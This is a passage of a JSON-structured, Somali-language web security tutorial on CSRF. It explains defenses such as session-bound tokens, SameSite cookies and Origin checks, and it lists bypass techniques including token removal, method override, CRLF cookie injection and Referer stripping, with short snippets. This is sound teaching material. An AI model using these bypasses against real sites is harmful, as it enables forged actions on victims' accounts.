+     "text": "Waa in la helo dhammaan actions-ka. Waa in la sameeyaa inventory.",
+     "id": "part-3-b67"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Tallaabo 2: Falanqee Request-ka: Waa in la falanqeeyaa request-ka. Waa in la ogaado qayb kasta.",
+     "text": "Tallaabo 2: Falanqee Request-ka: Waa in la falanqeeyaa request-ka. Waa in la ogaado qayb kasta.",
+     "id": "part-3-b68",
+     "slug": "tallaabo-2-falanqee-request-ka-waa-in-la-falanqeeyaa-request-ka-waa-in-la-ogaado-qayb-kasta"
+    },
+    {
+     "type": "para",
+     "html": "Farsamo:",
+     "text": "Farsamo:",
+     "id": "part-3-b69"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Method — GET, POST, PUT, DELETE?",
+       "text": "Method — GET, POST, PUT, DELETE?",
+       "level": 0
+      },
+      {
+       "html": "Cookies — session, csrf, csrfKey?",
+       "text": "Cookies — session, csrf, csrfKey?",
+       "level": 0
+      },
+      {
+       "html": "Body — csrf token, parameters?",
+       "text": "Body — csrf token, parameters?",
+       "level": 0
+      },
+      {
+       "html": "Headers — Origin, Referer, Content-Type?",
+       "text": "Headers — Origin, Referer, Content-Type?",
+       "level": 0
+      }
+     ],
+     "id": "part-3-b70"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Tallaabo 3: Tijaabi Defenses",
+     "text": "Tallaabo 3: Tijaabi Defenses",
+     "id": "part-3-b71",
+     "slug": "tallaabo-3-tijaabi-defenses"
+    },
+    {
+     "type": "para",
+     "html": "Waa in la tijaabiyaa defenses-ka. Waa in la ogaado waxa jira iyo waxa maqan.",
+     "text": "Waa in la tijaabiyaa defenses-ka. Waa in la ogaado waxa jira iyo waxa maqan.",
+     "id": "part-3-b72"
+    },
+    {
+     "type": "para",
+     "html": "Farsamo:",
+     "text": "Farsamo:",
+     "id": "part-3-b73"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Ma jiraa CSRF token?",
+       "text": "Ma jiraa CSRF token?",
+       "level": 0
+      },
+      {
+       "html": "SameSite maxay tahay?",
+       "text": "SameSite maxay tahay?",
+       "level": 0
+      },
+      {
+       "html": "Ma jiraa Referer/Origin validation?",
+       "text": "Ma jiraa Referer/Origin validation?",
+       "level": 0
+      },
+      {
+       "html": "Ma jiraa custom header?",
+       "text": "Ma jiraa custom header?",
+       "level": 0
+      }
+     ],
+     "id": "part-3-b74"
+    },
+    {
+     "type": "para",
+     "html": "Waa in la tijaabiyaa mid kasta. Waa in la diiwaangeliyo natiijada.",
+     "text": "Waa in la tijaabiyaa mid kasta. Waa in la diiwaangeliyo natiijada.",
+     "id": "part-3-b75"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Tallaabo 4: Isku Day Bypass",
+     "text": "Tallaabo 4: Isku Day Bypass",
+     "id": "part-3-b76",
+     "slug": "tallaabo-4-isku-day-bypass"
+    },
+    {
+     "type": "para",
+     "html": "Waa in la isku dayaa bypass. Waa in la jabiyaa defenses-ka.",
+     "text": "Waa in la isku dayaa bypass. Waa in la jabiyaa defenses-ka.",
+     "id": "part-3-b77"
+    },
+    {
+     "type": "para",
+     "html": "Farsamo:",
+     "text": "Farsamo:",
+     "id": "part-3-b78"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Tirtir token.",
+       "text": "Tirtir token.",
+       "level": 0
+      },
+      {
+       "html": "Beddel method.",
+       "text": "Beddel method.",
+       "level": 0
+      },
+      {
+       "html": "Beddel token user A → user B.",
+       "text": "Beddel token user A → user B.",
+       "level": 0
+      },
+      {
+       "html": "CRLF injection.",
+       "text": "CRLF injection.",
+       "level": 0
+      },
+      {
+       "html": "Client-side redirect.",
+       "text": "Client-side redirect.",
+       "level": 0
+      },
+      {
+       "html": "Sibling domain + XSS.",
+       "text": "Sibling domain + XSS.",
+       "level": 0
+      },
+      {
+       "html": "Cookie refresh.",
+       "text": "Cookie refresh.",
+       "level": 0
+      }
+     ],
+     "id": "part-3-b79"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "Fikirka Developer-ka: Sida Looga Hortago CSRF",
+     "text": "Fikirka Developer-ka: Sida Looga Hortago CSRF",
+     "id": "part-3-b80",
+     "slug": "fikirka-developer-ka-sida-looga-hortago-csrf"
+    },
+    {
+     "type": "para",
+     "html": "Developer-ku wuxuu u baahan yahay inuu fahmo saddex waxyaabood:",
+     "text": "Developer-ku wuxuu u baahan yahay inuu fahmo saddex waxyaabood:",
+     "id": "part-3-b81"
+    },
+    {
+     "type": "para",
+     "html": "1. CSRF token waa in uu session-ka ku xiran yahay.",
+     "text": "1. CSRF token waa in uu session-ka ku xiran yahay.",
+     "id": "part-3-b82"
+    },
+    {
+     "type": "code",
+     "lang": null,
+     "lines": [
+      "$_SESSION['csrf'] = bin2hex(random_bytes(32));",
+      "if ($_POST['csrf'] !== $_SESSION['csrf']) die(\"Invalid\");"
+     ],
+     "id": "part-3-b83"
+    },
+    {
+     "type": "para",
+     "html": "2. SameSite waa in la dhigo.",
+     "text": "2. SameSite waa in la dhigo.",
+     "id": "part-3-b84"
+    },
+    {
+     "type": "code",
+     "lang": null,
+     "lines": [
+      "Set-Cookie: session=...; SameSite=Strict; Secure; HttpOnly"
+     ],
+     "id": "part-3-b85"
+    },
+    {
+     "type": "para",
+     "html": "3. Origin/Referer waa in la xaqiijiyaa (si sax ah).",
+     "text": "3. Origin/Referer waa in la xaqiijiyaa (si sax ah).",
+     "id": "part-3-b86"
+    },
+    {
+     "type": "code",
+     "lang": null,
+     "lines": [
+      "$origin = $_SERVER['HTTP_ORIGIN'] ?? '';",
+      "if ($origin !== 'https://yourdomain.com') die(\"Invalid Origin\");"
+     ],
+     "id": "part-3-b87"
+    },
+    {
+     "type": "para",
+     "html": "Developer-ku wuxuu u baahan yahay inuu fahmo falsafadda CSRF. Wuxuu u baahan yahay inuu ogaado in browser-ku uu confused deputy yahay. Wuxuu u baahan yahay inuu ogaado in cookie-ga aanu caddaynaynin intention-ka.",
+     "text": "Developer-ku wuxuu u baahan yahay inuu fahmo falsafadda CSRF. Wuxuu u baahan yahay inuu ogaado in browser-ku uu confused deputy yahay. Wuxuu u baahan yahay inuu ogaado in cookie-ga aanu caddaynaynin intention-ka.",
+     "id": "part-3-b88"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "MUXUU Developer-ku u Illoobaa CSRF?",
+     "text": "MUXUU Developer-ku u Illoobaa CSRF?",
+     "id": "part-3-b89",
+     "slug": "muxuu-developer-ku-u-illoobaa-csrf"
+    },
+    {
+     "type": "para",
+     "html": "Developer-ku wuxuu u illoobaa CSRF sababtoo ah saddex waxyaabood:",
+     "text": "Developer-ku wuxuu u illoobaa CSRF sababtoo ah saddex waxyaabood:",
+     "id": "part-3-b90"
+    },
+    {
+     "type": "para",
+     "html": "1. Happy Path BiasDeveloper-ku wuxuu ku fikiraa user wanaagsan. Wuxuu yiraahdaa: \"User-ku wuxuu buuxinayaa form-ka, wuxuu riixayaa Submit.\" Wuxuu illoobaa attacker-ka.",
+     "text": "1. Happy Path BiasDeveloper-ku wuxuu ku fikiraa user wanaagsan. Wuxuu yiraahdaa: \"User-ku wuxuu buuxinayaa form-ka, wuxuu riixayaa Submit.\" Wuxuu illoobaa attacker-ka.",
+     "id": "part-3-b91"
+    },
+    {
+     "type": "para",
+     "html": "2. Framework TrustDeveloper-ku wuxuu aaminsan yahay framework-ka. Wuxuu yiraahdaa: \"Framework-ku difaac ayuu leeyahay.\" Laakiin framework-ku wuxuu ilaalinayaa kaliya haddii si sax ah loo isticmaalo.",
+     "text": "2. Framework TrustDeveloper-ku wuxuu aaminsan yahay framework-ka. Wuxuu yiraahdaa: \"Framework-ku difaac ayuu leeyahay.\" Laakiin framework-ku wuxuu ilaalinayaa kaliya haddii si sax ah loo isticmaalo.",
+     "id": "part-3-b92"
+    },
+    {
+     "type": "para",
+     "html": "3. ComplexityCSRF waa mid adag. Waa mid qoto dheer. Developer-ku wuxuu rabaa shay fudud. Wuxuu illoobaa defense-in-depth.",
+     "text": "3. ComplexityCSRF waa mid adag. Waa mid qoto dheer. Developer-ku wuxuu rabaa shay fudud. Wuxuu illoobaa defense-in-depth.",
+     "id": "part-3-b93"
+    }
+   ],
+   "id": "part-3",
+   "index": 3
+  },
+  {
+   "title": "QAYBTA IV  DEFENSES",
+   "blocks": [
+    {
+     "type": "para",
+     "html": "Waxaa jira khalad weyn oo bug hunters badan sameeyaan. Waxay u arkaan defenses-ka sida code. Waxay yiraahdaan: \"Haddii code-ku jiro, defense-ku wuu shaqeynayaa.\" Laakiin taasi waa been.",
+     "text": "Waxaa jira khalad weyn oo bug hunters badan sameeyaan. Waxay u arkaan defenses-ka sida code. Waxay yiraahdaan: \"Haddii code-ku jiro, defense-ku wuu shaqeynayaa.\" Laakiin taasi waa been.",
+     "id": "part-4-b0"
+    },
+    {
+     "type": "para",
+     "html": "Difaacu waa fikrad. Waa falsafad. Waa assumption. . Code-ku wuxuu kaliya implement gareeyaa fikradda. Haddii fikraddu khaldan tahay, code-ku wuu khaldan yahay. Haddii fikraddu jaban tahay, code-ku wuu jaban yahay.",
+     "text": "Difaacu waa fikrad. Waa falsafad. Waa assumption. . Code-ku wuxuu kaliya implement gareeyaa fikradda. Haddii fikraddu khaldan tahay, code-ku wuu khaldan yahay. Haddii fikraddu jaban tahay, code-ku wuu jaban yahay.",
+     "id": "part-4-b1"
+    },
+    {
+     "type": "para",
+     "html": "Defense kastaa wuxuu ku salaysan yahay male-awaal. Wuxuu yiraahdaa: \"Attacker-ku ma sameyn karo waxan.\" Wuxuu yiraahdaa: \"Browser-ku wuxuu u dhaqmaa sidaan.\" Wuxuu yiraahdaa: \"User-ku wuxuu sameeyaa sidaas.\" Haddii male-awaalku khaldan yahay, defense-ku wuu khaldamaa.",
+     "text": "Defense kastaa wuxuu ku salaysan yahay male-awaal. Wuxuu yiraahdaa: \"Attacker-ku ma sameyn karo waxan.\" Wuxuu yiraahdaa: \"Browser-ku wuxuu u dhaqmaa sidaan.\" Wuxuu yiraahdaa: \"User-ku wuxuu sameeyaa sidaas.\" Haddii male-awaalku khaldan yahay, defense-ku wuu khaldamaa.",
+     "id": "part-4-b2"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "CSRF Token",
+     "text": "CSRF Token",
+     "id": "part-4-b3",
+     "slug": "csrf-token"
+    },
+    {
+     "type": "para",
+     "html": "CSRF token waa qoraal sir ah oo lagu daro form-ka. Ujeeddadiisu waa:",
+     "text": "CSRF token waa qoraal sir ah oo lagu daro form-ka. Ujeeddadiisu waa:",
+     "id": "part-4-b4"
+    },
+    {
+     "type": "para",
+     "html": "\"Haddii attacker-ku aanu garanayn token-ka, ma diri karo request sax ah.\"",
+     "text": "\"Haddii attacker-ku aanu garanayn token-ka, ma diri karo request sax ah.\"",
+     "id": "part-4-b5"
+    },
+    {
+     "type": "para",
+     "html": "Token-ku waa caqabad. Waa obstacle. Waa secret. Wuxuu ku salaysan yahay male-awaalka:",
+     "text": "Token-ku waa caqabad. Waa obstacle. Waa secret. Wuxuu ku salaysan yahay male-awaalka:",
+     "id": "part-4-b6"
+    },
+    {
+     "type": "list",
+     "ordered": true,
+     "items": [
+      {
+       "html": "Attacker-ku ma garanayo token-ka.",
+       "text": "Attacker-ku ma garanayo token-ka.",
+       "level": 0
+      },
+      {
+       "html": "Attacker-ku ma akhrin karo token-ka (sababtoo ah SOP).",
+       "text": "Attacker-ku ma akhrin karo token-ka (sababtoo ah SOP).",
+       "level": 0
+      },
+      {
+       "html": "Attacker-ku ma saadaalin karo token-ka (sababtoo ah  waa random).",
+       "text": "Attacker-ku ma saadaalin karo token-ka (sababtoo ah  waa random).",
+       "level": 0
+      }
+     ],
+     "id": "part-4-b7"
+    },
+    {
+     "type": "para",
+     "html": "Haddii mid ka mid ah male-awaalkan khaldan yahay, token-ku waa la dhaafi karaa",
+     "text": "Haddii mid ka mid ah male-awaalkan khaldan yahay, token-ku waa la dhaafi karaa",
+     "id": "part-4-b8"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Noocyada CSRF Token",
+     "text": "Noocyada CSRF Token",
+     "id": "part-4-b9",
+     "slug": "noocyada-csrf-token"
+    },
+    {
+     "type": "para",
+     "html": "1. Synchronizer Token PatternToken-ka waxaa lagu kaydiyaa session-ka. Marka request-ku yimaado, server-ku wuxuu barbardhigaa token-ka body-ga iyo session-ka.",
+     "text": "1. Synchronizer Token PatternToken-ka waxaa lagu kaydiyaa session-ka. Marka request-ku yimaado, server-ku wuxuu barbardhigaa token-ka body-ga iyo session-ka.",
+     "id": "part-4-b10"
+    },
+    {
+     "type": "code",
+     "lang": null,
+     "lines": [
+      "Session: csrf = \"ABC123\"",
+      "Form:    csrf = \"ABC123\"",
+      "Server:  \"ABC123\" == \"ABC123\" → OK"
+     ],
+     "id": "part-4-b11"
+    },
+    {
+     "type": "para",
+     "html": "Token-ku waa session-bound. Waa user-specific. Waa stateful.",
+     "text": "Token-ku waa session-bound. Waa user-specific. Waa stateful.",
+     "id": "part-4-b12"
+    },
+    {
+     "type": "para",
+     "html": "Haddii token-ku aanu session-ka ku xirneyn , waa la jabsan karaa.",
+     "text": "Haddii token-ku aanu session-ka ku xirneyn , waa la jabsan karaa.",
+     "id": "part-4-b13"
+    },
+    {
+     "type": "para",
+     "html": "2. Double Submit CookieToken-ka waxaa lagu diraa cookie iyo body. Server-ku wuxuu is barbardhigaa labadaba.",
+     "text": "2. Double Submit CookieToken-ka waxaa lagu diraa cookie iyo body. Server-ku wuxuu is barbardhigaa labadaba.",
+     "id": "part-4-b14"
+    },
+    {
+     "type": "code",
+     "lang": "text",
+     "lines": [
+      "Cookie: csrf = \"ABC123\"",
+      "Body:   csrf = \"ABC123\"",
+      "Server: \"ABC123\" == \"ABC123\" → OK"
+     ],
+     "id": "part-4-b15"
+    },
+    {
+     "type": "para",
+     "html": "Haddii attacker-ku uu cookie-ga ku soo dhex geli karo browser-ka victim (CRLF injection), waa la jabi karaa.",
+     "text": "Haddii attacker-ku uu cookie-ga ku soo dhex geli karo browser-ka victim (CRLF injection), waa la jabi karaa.",
+     "id": "part-4-b16"
+    },
+    {
+     "type": "para",
+     "html": "3. Encrypted Token PatternToken-ka waa encrypted. Server-ku wuxuu decrypt-gareeyaa si uu u xaqiijiyo.",
+     "text": "3. Encrypted Token PatternToken-ka waa encrypted. Server-ku wuxuu decrypt-gareeyaa si uu u xaqiijiyo.",
+     "id": "part-4-b17"
+    },
+    {
+     "type": "code",
+     "lang": "te",
+     "lines": [
+      "Token: ENC(user_id, timestamp, random)",
+      "Server: decrypt → verify"
+     ],
+     "id": "part-4-b18"
+    },
+    {
+     "type": "para",
+     "html": "4. HMAC Token PatternToken-ka waa HMAC oo lagu sameeyay session-ka.",
+     "text": "4. HMAC Token PatternToken-ka waa HMAC oo lagu sameeyay session-ka.",
+     "id": "part-4-b19"
+    },
+    {
+     "type": "code",
+     "lang": "text",
+     "lines": [
+      "Token: HMAC(session_id, secret)",
+      "Server: HMAC(session_id, secret) == token → OK"
+     ],
+     "id": "part-4-b20"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "4.2.3 Sida Loo Jebiyo CSRF Token",
+     "text": "4.2.3 Sida Loo Jebiyo CSRF Token",
+     "id": "part-4-b21",
+     "slug": "4-2-3-sida-loo-jebiyo-csrf-token"
+    },
+    {
+     "type": "para",
+     "html": "Token-ku wuxuu leeyahay shuruudo oo waa in uu buuxiyaa. Haddii mid ka mid ah aanu buuxin, waa la jabin karaa.",
+     "text": "Token-ku wuxuu leeyahay shuruudo oo waa in uu buuxiyaa. Haddii mid ka mid ah aanu buuxin, waa la jabin karaa.",
+     "id": "part-4-b22"
+    },
+    {
+     "type": "table",
+     "rows": [
+      [
+       "Shuruud",
+       "Haddii aan la buuxin",
+       "Bypass"
+      ],
+      [
+       "Jiraa",
+       "Token maqan",
+       "Tirtir token-ka"
+      ],
+      [
+       "Sir",
+       "Token la saadaalin karo",
+       "Saadaalin"
+      ],
+      [
+       "Session-bound",
+       "Token aan session ku xirneyn",
+       "Token user A → user B"
+      ],
+      [
+       "Single-use",
+       "Token la isticmaali karo marar badan",
+       "Reuse"
+      ],
+      [
+       "Method-bound",
+       "Token lagu xaqiijiyay method gaar ah",
+       "Method override"
+      ],
+      [
+       "Presence-bound",
+       "Token lagu xaqiijiyay presence",
+       "Tirtir token-ka"
+      ],
+      [
+       "Cookie-bound",
+       "Token lagu xaqiijiyay cookie",
+       "CRLF injection"
+      ]
+     ],
+     "id": "part-4-b23"
+    },
+    {
+     "type": "para",
+     "html": "Token-ku waa defense. Waa caqabad. Waa secret. Laakiin defense kastaa waa la jabsan karaa haddii male-awaalku khaldan yahay.",
+     "text": "Token-ku waa defense. Waa caqabad. Waa secret. Laakiin defense kastaa waa la jabsan karaa haddii male-awaalku khaldan yahay.",
+     "id": "part-4-b24"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "SameSite: Falsafadda Xaddidaadda",
+     "text": "SameSite: Falsafadda Xaddidaadda",
+     "id": "part-4-b25",
+     "slug": "samesite-falsafadda-xaddidaadda"
+    },
+    {
+     "type": "para",
+     "html": "SameSite waa cookie attribute oo xaddida cross-site behavior. Wuxuu leeyahay saddex qiime:",
+     "text": "SameSite waa cookie attribute oo xaddida cross-site behavior. Wuxuu leeyahay saddex qiime:",
+     "id": "part-4-b26"
+    },
+    {
+     "type": "para",
+     "html": "1. SameSite=Strict",
+     "text": "1. SameSite=Strict",
+     "id": "part-4-b27"
+    },
+    {
+     "type": "code",
+     "lang": null,
+     "lines": [
+      "Cookie-ga lama diro cross-site haba ahaatee."
+     ],
+     "id": "part-4-b28"
+    },
+    {
+     "type": "para",
+     "html": "Strict waa isolation. Waa maximal security. Waa minimal convenience.",
+     "text": "Strict waa isolation. Waa maximal security. Waa minimal convenience.",
+     "id": "part-4-b29"
+    },
+    {
+     "type": "list",
+     "ordered": true,
+     "items": [
+      {
+       "html": "User-ku wuxuu ku qasban yahay inuu same-site u baahan yahay.",
+       "text": "User-ku wuxuu ku qasban yahay inuu same-site u baahan yahay.",
+       "level": 0
+      },
+      {
+       "html": "Cross-site requests waa khatar.",
+       "text": "Cross-site requests waa khatar.",
+       "level": 0
+      },
+      {
+       "html": "Cookie-ga waa qarsoodi.",
+       "text": "Cookie-ga waa qarsoodi.",
+       "level": 0
+      }
+     ],
+     "id": "part-4-b30"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Client-side redirect .",
+       "text": "Client-side redirect .",
+       "level": 0
+      },
+      {
+       "html": "Sibling domain .",
+       "text": "Sibling domain .",
+       "level": 0
+      },
+      {
+       "html": "XSS on same-site.",
+       "text": "XSS on same-site.",
+       "level": 0
+      }
+     ],
+     "id": "part-4-b31"
+    },
+    {
+     "type": "para",
+     "html": "2. SameSite=Lax",
+     "text": "2. SameSite=Lax",
+     "id": "part-4-b32"
+    },
+    {
+     "type": "code",
+     "lang": null,
+     "lines": [
+      "Cookie-ga waa la diraa cross-site kaliya haddii:",
+      "- Request-ku yahay GET",
+      "- Request-ku yahay top-level navigation"
+     ],
+     "id": "part-4-b33"
+    },
+    {
+     "type": "list",
+     "ordered": true,
+     "items": [
+      {
+       "html": "GET waa safe — ma beddelo state.",
+       "text": "GET waa safe — ma beddelo state.",
+       "level": 0
+      },
+      {
+       "html": "Top-level navigation waa user-intended.",
+       "text": "Top-level navigation waa user-intended.",
+       "level": 0
+      },
+      {
+       "html": "POST waa khatar — wuu beddelaa state.",
+       "text": "POST waa khatar — wuu beddelaa state.",
+       "level": 0
+      },
+      {
+       "html": "GET + method override (lab-kii hore).",
+       "text": "GET + method override (lab-kii hore).",
+       "level": 0
+      },
+      {
+       "html": "Cookie refresh (lab-kii hore).",
+       "text": "Cookie refresh (lab-kii hore).",
+       "level": 0
+      }
+     ],
+     "id": "part-4-b34"
+    },
+    {
+     "type": "para",
+     "html": "3. SameSite=None",
+     "text": "3. SameSite=None",
+     "id": "part-4-b35"
+    },
+    {
+     "type": "code",
+     "lang": "text",
+     "lines": [
+      "Cookie-ga waa la diraa cross-site had iyo jeer.",
+      "Waa in la daro Secure."
+     ],
+     "id": "part-4-b36"
+    },
+    {
+     "type": "list",
+     "ordered": true,
+     "items": [
+      {
+       "html": "Cross-site requests waa lagama maarmaan.",
+       "text": "Cross-site requests waa lagama maarmaan.",
+       "level": 0
+      },
+      {
+       "html": "User-ku wuxuu ku qasban yahay inuu cross-site u baahan yahay.",
+       "text": "User-ku wuxuu ku qasban yahay inuu cross-site u baahan yahay.",
+       "level": 0
+      },
+      {
+       "html": "Security waa secondary.",
+       "text": "Security waa secondary.",
+       "level": 0
+      },
+      {
+       "html": "CSRF waa mid fudud.",
+       "text": "CSRF waa mid fudud.",
+       "level": 0
+      }
+     ],
+     "id": "part-4-b37"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "4.3.2 Sida Loo Jebiyo SameSite",
+     "text": "4.3.2 Sida Loo Jebiyo SameSite",
+     "id": "part-4-b38",
+     "slug": "4-3-2-sida-loo-jebiyo-samesite"
+    },
+    {
+     "type": "table",
+     "rows": [
+      [
+       "SameSite",
+       "Bypass"
+      ],
+      [
+       "Strict",
+       "Client-side redirect, sibling domain, XSS"
+      ],
+      [
+       "Lax",
+       "Method override, cookie refresh, top-level GET"
+      ],
+      [
+       "None",
+       "CSRF waa mid fudud"
+      ]
+     ],
+     "id": "part-4-b39"
+    },
+    {
+     "type": "para",
+     "html": "SameSite waa defense. Waa rule. Laakiin rule kastaa wuu leeyahay exception. Attacker-ku wuxuu raadiyaa exception-ka.",
+     "text": "SameSite waa defense. Waa rule. Laakiin rule kastaa wuu leeyahay exception. Attacker-ku wuxuu raadiyaa exception-ka.",
+     "id": "part-4-b40"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "4.4 Origin/Referer Validation: Falsafadda Xaqiijinta",
+     "text": "4.4 Origin/Referer Validation: Falsafadda Xaqiijinta",
+     "id": "part-4-b41",
+     "slug": "4-4-origin-referer-validation-falsafadda-xaqiijinta"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "4.4.1 ",
+     "text": "4.4.1",
+     "id": "part-4-b42",
+     "slug": "4-4-1"
+    },
+    {
+     "type": "para",
+     "html": "Origin/Referer validation waa defense oo xaqiijiya halka request-ku ka yimid.",
+     "text": "Origin/Referer validation waa defense oo xaqiijiya halka request-ku ka yimid.",
+     "id": "part-4-b43"
+    },
+    {
+     "type": "para",
+     "html": "Origin header:",
+     "text": "Origin header:",
+     "id": "part-4-b44"
+    },
+    {
+     "type": "code",
+     "lang": "te",
+     "lines": [
+      "Origin: https://target.com"
+     ],
+     "id": "part-4-b45"
+    },
+    {
+     "type": "para",
+     "html": "Referer header:",
+     "text": "Referer header:",
+     "id": "part-4-b46"
+    },
+    {
+     "type": "code",
+     "lang": "text",
+     "lines": [
+      "Referer: https://target.com/my-account"
+     ],
+     "id": "part-4-b47"
+    },
+    {
+     "type": "list",
+     "ordered": true,
+     "items": [
+      {
+       "html": "Browser-ku wuxuu si toos ah u diraa Origin/Referer.",
+       "text": "Browser-ku wuxuu si toos ah u diraa Origin/Referer.",
+       "level": 0
+      },
+      {
+       "html": "Attacker-ku ma beddeli karo Origin/Referer.",
+       "text": "Attacker-ku ma beddeli karo Origin/Referer.",
+       "level": 0
+      },
+      {
+       "html": "Server-ku wuxuu xaqiijiyaa si sax ah.",
+       "text": "Server-ku wuxuu xaqiijiyaa si sax ah.",
+       "level": 0
+      }
+     ],
+     "id": "part-4-b48"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Sida Loo Jebiyo Origin/Referer",
+     "text": "Sida Loo Jebiyo Origin/Referer",
+     "id": "part-4-b49",
+     "slug": "sida-loo-jebiyo-origin-referer"
+    },
+    {
+     "type": "para",
+     "html": "1. Referer MaqanHaddii server-ku aanu xaqiijin Referer maqan, attacker-ku wuu tirtiri karaa:",
+     "text": "1. Referer MaqanHaddii server-ku aanu xaqiijin Referer maqan, attacker-ku wuu tirtiri karaa:",
+     "id": "part-4-b50"
+    },
+    {
+     "type": "code",
+     "lang": "html",
+     "lines": [
+      "<meta name=\"referrer\" content=\"no-referrer\">"
+     ],
+     "id": "part-4-b51"
+    },
+    {
+     "type": "para",
+     "html": "2. Referer Jaban (Substring Match)Haddii server-ku uu isticmaalo substring match, attacker-ku wuxuu ku dari karaa domain-ka query string-ka:",
+     "text": "2. Referer Jaban (Substring Match)Haddii server-ku uu isticmaalo substring match, attacker-ku wuxuu ku dari karaa domain-ka query string-ka:",
+     "id": "part-4-b52"
+    },
+    {
+     "type": "code",
+     "lang": "javascript",
+     "lines": [
+      "history.pushState(\"\", \"\", \"/?target.com\");"
+     ],
+     "id": "part-4-b53"
+    },
+    {
+     "type": "para",
+     "html": "3. Origin MaqanHaddii request-ku aanu lahayn Origin (tusaale form GET), attacker-ku wuu isticmaali karaa.",
+     "text": "3. Origin MaqanHaddii request-ku aanu lahayn Origin (tusaale form GET), attacker-ku wuu isticmaali karaa.",
+     "id": "part-4-b54"
+    },
+    {
+     "type": "para",
+     "html": "4. Origin Jaban ",
+     "text": "4. Origin Jaban",
+     "id": "part-4-b55"
+    },
+    {
+     "type": "para",
+     "html": ")Haddii server-ku uu aqbalo subdomain kasta, attacker-ku wuxuu isticmaali karaa XSS on subdomain.",
+     "text": ")Haddii server-ku uu aqbalo subdomain kasta, attacker-ku wuxuu isticmaali karaa XSS on subdomain.",
+     "id": "part-4-b56"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "Custom Headers:  X-Requested-With",
+     "text": "Custom Headers:  X-Requested-With",
+     "id": "part-4-b57",
+     "slug": "custom-headers-x-requested-with"
+    },
+    {
+     "type": "para",
+     "html": "Custom headers waa defense oo u baahan header gaar ah. Tusaale:",
+     "text": "Custom headers waa defense oo u baahan header gaar ah. Tusaale:",
+     "id": "part-4-b58"
+    },
+    {
+     "type": "code",
+     "lang": "text",
+     "lines": [
+      "X-Requested-With: XMLHttpRequest"
+     ],
+     "id": "part-4-b59"
+    },
+    {
+     "type": "para",
+     "html": ": Custom headers waa signal. Waa marker. Waa proof of intent.",
+     "text": ": Custom headers waa signal. Waa marker. Waa proof of intent.",
+     "id": "part-4-b60"
+    },
+    {
+     "type": "para",
+     "html": "Male-awaal:",
+     "text": "Male-awaal:",
+     "id": "part-4-b61"
+    },
+    {
+     "type": "list",
+     "ordered": true,
+     "items": [
+      {
+       "html": "Attacker-ku ma diri karo custom headers cross-site.",
+       "text": "Attacker-ku ma diri karo custom headers cross-site.",
+       "level": 0
+      },
+      {
+       "html": "Sababtoo ah CORS wuxuu u baahan yahay preflight.",
+       "text": "Sababtoo ah CORS wuxuu u baahan yahay preflight.",
+       "level": 0
+      },
+      {
+       "html": "Preflight wuxuu u baahan yahay server-ku ogolaado.",
+       "text": "Preflight wuxuu u baahan yahay server-ku ogolaado.",
+       "level": 0
+      }
+     ],
+     "id": "part-4-b62"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "Defense-in-Depth",
+     "text": "Defense-in-Depth",
+     "id": "part-4-b63",
+     "slug": "defense-in-depth"
+    },
+    {
+     "type": "para",
+     "html": "\"Ha isku halayn hal defense. Isticmaal lakabyo badan.\"",
+     "text": "\"Ha isku halayn hal defense. Isticmaal lakabyo badan.\"",
+     "id": "part-4-b64"
+    },
+    {
+     "type": "para",
+     "html": "Lakabyada CSRF defense:",
+     "text": "Lakabyada CSRF defense:",
+     "id": "part-4-b65"
+    },
+    {
+     "type": "list",
+     "ordered": true,
+     "items": [
+      {
+       "html": "CSRF token (session-bound)",
+       "text": "CSRF token (session-bound)",
+       "level": 0
+      },
+      {
+       "html": "SameSite=Strict",
+       "text": "SameSite=Strict",
+       "level": 0
+      },
+      {
+       "html": "Origin validation",
+       "text": "Origin validation",
+       "level": 0
+      },
+      {
+       "html": "Referer validation",
+       "text": "Referer validation",
+       "level": 0
+      },
+      {
+       "html": "Custom header",
+       "text": "Custom header",
+       "level": 0
+      },
+      {
+       "html": "Re-authentication",
+       "text": "Re-authentication",
+       "level": 0
+      },
+      {
+       "html": "Content-Type validation",
+       "text": "Content-Type validation",
+       "level": 0
+      },
+      {
+       "html": "CSP",
+       "text": "CSP",
+       "level": 0
+      }
+     ],
+     "id": "part-4-b66"
+    }
+   ],
+   "id": "part-4",
+   "index": 4
+  },
+  {
+   "title": "QAYBTA V — BILOW: LABS-KA FUDUD",
+   "blocks": [
+    {
+     "type": "para",
+     "html": "Waxaa jira dhibaato oo bug hunter kasta uu la kulmo bilowga. Dhibaatadu ma aha aqoon la'aan. Dhibaatadu ma aha qalab la'aan. Dhibaatadu waa aragtida.",
+     "text": "Waxaa jira dhibaato oo bug hunter kasta uu la kulmo bilowga. Dhibaatadu ma aha aqoon la'aan. Dhibaatadu ma aha qalab la'aan. Dhibaatadu waa aragtida.",
+     "id": "part-5-b0"
+    },
+    {
+     "type": "para",
+     "html": "Bug hunter-ka cusub wuxuu arkaa form. Wuxuu arkaa button. Wuxuu arkaa email input. Wuxuu arkaa submit. Wuxuu yiraahdaa: \"Waxba kuma jiro. Waa form caadi ah.\"",
+     "text": "Bug hunter-ka cusub wuxuu arkaa form. Wuxuu arkaa button. Wuxuu arkaa email input. Wuxuu arkaa submit. Wuxuu yiraahdaa: \"Waxba kuma jiro. Waa form caadi ah.\"",
+     "id": "part-5-b1"
+    },
+    {
+     "type": "para",
